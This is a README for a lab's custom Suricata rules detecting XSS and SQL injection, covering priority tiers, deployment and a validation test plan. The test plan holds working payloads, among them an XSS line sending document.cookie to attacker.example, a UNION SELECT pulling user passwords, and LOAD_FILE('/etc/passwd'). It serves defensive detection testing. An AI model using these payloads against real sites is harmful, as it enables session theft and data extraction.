# Custom Suricata Rules - XSS + SQLi Detection

Team-authored Suricata rules for XSS and SQL-injection detection. The lab runs these custom rules only - Emerging Threats (ET) Open and built-in protocol-anomaly rules are disabled so the alert feed is scoped to these two attack classes.

---

## Files

| File | Rules | SID range |
|------|-------|-----------|
| `xss_alerts.rules` | 58 | `1000001-1000058` |
| `sqli_alerts.rules` | 13 | `1000101-1000113` |

Both files sit in the standard user-rule range (`1000000-1999999`), clear of the ET Open reserved range (`2000000-2999999`).

---

## Priority Tiers

Both rulesets use a three-tier `priority:` scheme. Suricata maps `priority:N` to `alert.severity`, which the AI module renders as:

| Tier | `priority:` | Dashboard severity |
|------|-------------|--------------------|
| P1 | 1 | **critical** |
| P2 | 2 | **high** |
| P3 | 3 | **low** |

### XSS - `xss_alerts.rules`

| Tier | Count | Behaviour matched |
|------|-------|--------------------|
| P1 | 39 | Confirmed exploit chains: `document.cookie` + exfiltration channel (`fetch`, `Image()`, `XMLHttpRequest`, `sendBeacon`, `WebSocket`, `postMessage`, `window.location`), or `<script>` paired with `document.cookie` / `eval()` / `document.write()` / remote `src=`, or obfuscation (`String.fromCharCode`, `atob`) + cookie access. |
| P2 | 12 | Encoded tag injection - script / iframe / marquee / details in URI / POST body / headers. PCRE covers raw `<` and URL-encoded `%3C`. |
| P3 | 7 | Wide-net indicators: JS sink keywords (`eval(`, `innerHTML`, `document.write(`), raw HTML tags, event handlers (`onerror=`, `onload=`, `onmouseover=`, `onfocus=`). |

### SQLi - `sqli_alerts.rules`

| Tier | SIDs | Behaviour matched |
|------|------|--------------------|
| P1 | 1000101-1000104 | Confirmed exploit / extraction: `UNION SELECT` (URI + POST), DB function calls (`version()`, `database()`, `user()`, `schema()`), OS-command primitives (`xp_cmdshell`, `LOAD_FILE`, `INTO OUTFILE/DUMPFILE`). |
| P2 | 1000105-1000109 | Clear injection structure: boolean-blind (`OR 1=1`), time-blind (`SLEEP`, `WAITFOR DELAY`, `pg_sleep`, `BENCHMARK`), comment sequences (`--`, `#`, `/*`), `information_schema` enumeration. |
| P3 | 1000110-1000113 | Wide net: SQL keyword + quote combinations in URI / POST / headers, URL-encoded SQLi characters. |

---

## Deployment

```bash
# 1. Find the rule directory for this Suricata install
sudo grep "default-rule-path" /etc/suricata/suricata.yaml
# Common value: /var/lib/suricata/rules

# 2. Copy both rule files
sudo cp lab/suricata/xss_alerts.rules lab/suricata/sqli_alerts.rules /var/lib/suricata/rules/

# 3. Edit /etc/suricata/suricata.yaml - set rule-files to load only the custom files:
#   rule-files:
#     - xss_alerts.rules
#     - sqli_alerts.rules
#   # - suricata.rules        # ET Open - disabled

# 4. Validate before restart
sudo suricata -T -c /etc/suricata/suricata.yaml
# Expect: "Configuration provided was successfully loaded. Exiting."

# 5. Reload Suricata
sudo systemctl reload suricata || sudo systemctl restart suricata

# 6. Verify 71 rules loaded
sudo grep -iE "rule files processed|successfully loaded" /var/log/suricata/suricata.log | tail -3
# Expect: "1 rule files processed. 71 rules successfully loaded, 0 rules failed"
```

**Why disable ET Open?** ET Open also fires on XSS/SQLi (its `ET WEB_SERVER` signatures), which doubles alerts and adds unrelated `ET SCAN` noise. Custom-only keeps the feed scoped to the project's two attack classes and makes every alert traceable. Trade-off: the broad P2/P3 rules still over-match on some benign traffic - that is the expected false-positive stream the AI triage layer classifies down to `likely_false_positive`.

---

## SID Conflict Check

Verify no duplicate SIDs before deploying:

```bash
sudo grep -h "sid:" /var/lib/suricata/rules/*.rules \
    | grep -oP "sid:\K\d+" \
    | sort -n | uniq -d
# Empty output = no duplicates
```

---

## Validation Test Plan

Monitor alerts live while testing:

```bash
sudo tail -f /var/log/suricata/eve.json \
    | jq 'select(.event_type=="alert") | {sid: .alert.signature_id, msg: .alert.signature}'
```

### XSS payloads - target a reflected XSS endpoint

```text
# P1 cookie exfiltration via fetch - fires sid 1000001/1000002
<script>fetch('http://attacker.example/?c='+document.cookie)</script>

# P1 script + eval - fires sid 1000015-1000017
<script>eval('alert(1)')</script>

# P2 URL-encoded script tag - fires sid 1000040
%3Cscript%3Ealert(1)%3C%2Fscript%3E

# P3 img with onerror - fires sid 1000055/1000057
<img src=x onerror=alert(1)>
```

### SQLi payloads - target a SQL injection endpoint (`?id=<payload>`)

```text
# P1 UNION SELECT - fires sid 1000101
1' UNION SELECT user, password FROM users#

# P1 DB function call - fires sid 1000103
1' AND version()#

# P1 OS command primitive - fires sid 1000104
1' UNION SELECT LOAD_FILE('/etc/passwd')#

# P2 boolean-blind - fires sid 1000105 (and 1000108 for comment)
1' OR 1=1#

# P2 time-blind - fires sid 1000106
1' OR SLEEP(5)#

# P2 information_schema enumeration - fires sid 1000109 (and 1000101)
1' UNION SELECT table_name,1 FROM information_schema.tables#

# P3 keyword + quote - fires sid 1000110
1' SELECT 1
```

### Negative tests - must NOT fire

```text
# Numeric ID with no injection structure
?id=1&Submit=Submit

# Plain page load
/path/to/xss-endpoint/

# Plain text mentioning keyword without structure
?name=I+saw+a+javascript+book
```

P2 SQLi rules 8 (`--`, `#`, `/*`) and P3 rule 12 (URL-encoded chars) are deliberately broad and will occasionally match benign requests. This is expected - they are the false-positive stream the AI triage layer is designed to handle.

---

## Known Limitations

1. **Priority tier not used by the suggestion generator.** `extract_attack_type()` collapses all rules to `attack_type = "XSS"` / `"SQLi"` regardless of P1/P2/P3. The `priority:` field does set `alert.severity` (dashboard critical/high/low) and reaches the LLM via the prompt, but the rule-based suggestion generator does not branch on tier.

2. **No `metadata: mitre_technique_id` on custom rules.** The MITRE tactic override maps from `attack_type` instead.

3. **SQLi rules match `any any -> any any`.** Broader coverage than the XSS rules (`$EXTERNAL_NET -> $HTTP_SERVERS`), but more exposure to internal traffic matching P2/P3 patterns. Tighten to `$EXTERNAL_NET -> $HTTP_SERVERS $HTTP_PORTS` if a quieter feed is needed.
